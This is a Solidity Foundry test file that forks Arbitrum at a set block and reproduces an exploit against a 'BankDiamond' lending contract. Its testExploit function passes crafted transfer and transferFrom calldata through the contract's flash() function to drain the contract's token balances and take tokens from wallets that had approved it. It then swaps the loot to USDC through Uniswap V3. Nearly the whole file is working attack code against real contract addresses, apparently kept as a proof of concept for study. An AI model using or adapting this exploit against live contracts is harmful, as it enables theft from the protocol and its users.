// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.15;

import "forge-std/Test.sol";

import "@interface/IERC20.sol";
import "@interface/IUniswapV3.sol";

import "./IBankDiamond.sol";

IBankDiamond constant BankDiamond = IBankDiamond(
    payable(0x598C6c1cd9459F882530FC9D7dA438CB74C6CB3b)
);
IUniswapV3Router constant UniV3Router = IUniswapV3Router(
    payable(0xE592427A0AEce92De3Edee1F18E0157C05861564)
);

IERC20 constant USDC_TOKEN = IERC20(0xaf88d065e77c8cC2239327C5EDb3A432268e5831);
IERC20 constant ARB_TOKEN = IERC20(0x912CE59144191C1204E64559FE8253a0e49E6548);
IERC20 constant LINK_TOKEN = IERC20(0xf97f4df75117a78c1A5a0DBb814Af92458539FB4);
IERC20 constant WSTETH_TOKEN = IERC20(
    0x5979D7b546E38E414F7E9822514be443A4800529
);
IERC20 constant WETH_TOKEN = IERC20(0x82aF49447D8a07e3bd95BD0d56f35241523fBab1);
IERC20 constant ARB_USDC_TOEKN = IERC20(
    0xFF970A61A04b1cA14834A43f5dE4533eBDDB5CC8
);

contract RicoTest is Test {
    function setUp() public {
        vm.createSelectFork("arb_one", 202_973_712);
    }

    function print(string memory _txt, uint256 value, uint256 decimal) public {
        emit log_named_decimal_uint(_txt, value, decimal);
    }

    function testExploit() public {
        print(
            "USDC Balance Before",
            IERC20(USDC_TOKEN).balanceOf(address(this)),
            6
        );

        // Transfer tokens from BankDiamond to the attacker
        BankDiamond.flash(address(USDC_TOKEN), _getTransferData(USDC_TOKEN));
        BankDiamond.flash(address(ARB_TOKEN), _getTransferData(ARB_TOKEN));
        BankDiamond.flash(address(LINK_TOKEN), _getTransferData(LINK_TOKEN));
        BankDiamond.flash(
            address(WSTETH_TOKEN),
            _getTransferData(WSTETH_TOKEN)
        );
        BankDiamond.flash(address(WETH_TOKEN), _getTransferData(WETH_TOKEN));
        BankDiamond.flash(
            address(ARB_USDC_TOEKN),
            _getTransferData(ARB_USDC_TOEKN)
        );

        // TransferFrom tokens from owners to the attacker
        transferFromOwner(
            0x512E07A093aAA20Ba288392EaDF03838C7a4e522,
            address(USDC_TOKEN)
        );
        transferFromOwner(
            0x83eCCb05386B2d10D05e1BaEa8aC89b5B7EA8290,
            address(USDC_TOKEN)
        );
        transferFromOwner(
            0x7b782A4D552a8ceB3924005a786a1a358BA63f71,
            address(WSTETH_TOKEN)
        );

        // Swap tokens to USDC using UniV3Router
        swapTokens(address(ARB_TOKEN));
        swapTokens(address(LINK_TOKEN));
        swapTokens(address(WSTETH_TOKEN));
        swapTokens(address(WETH_TOKEN));
        swapTokens(address(ARB_USDC_TOEKN));

        // Log balances after exploit
        print(
            "USDC Balance After",
            IERC20(USDC_TOKEN).balanceOf(address(this)),
            6
        );
        // USDC Balance After: 15068.068008
    }

    function _getTransferData(
        IERC20 token
    ) internal view returns (bytes memory data) {
        uint256 tokenBalance = token.balanceOf(address(BankDiamond));
        data = abi.encodeWithSelector(
            IERC20.transfer.selector,
            address(this),
            tokenBalance
        );
    }

    function _getTransferFromData(
        address token,
        address user
    ) internal view returns (bytes memory data) {
        uint256 tokenBalance = IERC20(token).balanceOf(address(BankDiamond));
        uint256 tokenAllowance = IERC20(token).allowance(
            user,
            address(BankDiamond)
        );
        if (tokenBalance >= tokenAllowance) {
            data = abi.encodeWithSelector(
                IERC20.transferFrom.selector,
                user,
                address(this),
                tokenBalance
            );
        }
    }

    function transferFromOwner(address owner, address token) internal {
        bytes memory callData = _getTransferFromData(token, owner);
        if (callData.length > 0) {
            BankDiamond.flash(token, callData);
        }
    }

    function swapTokens(address token) internal {
        uint256 tokenBalance = IERC20(token).balanceOf(address(this));
        IERC20(token).approve(address(UniV3Router), tokenBalance);

        ISwapRouter.ExactInputSingleParams memory params;
        params.tokenIn = token;
        params.tokenOut = address(USDC_TOKEN);
        params.fee = 3000;
        params.recipient = address(this);
        params.deadline = block.timestamp;
        params.amountIn = tokenBalance;
        params.amountOutMinimum = 0;
        params.sqrtPriceLimitX96 = 0;
        UniV3Router.exactInputSingle(params);
    }
}
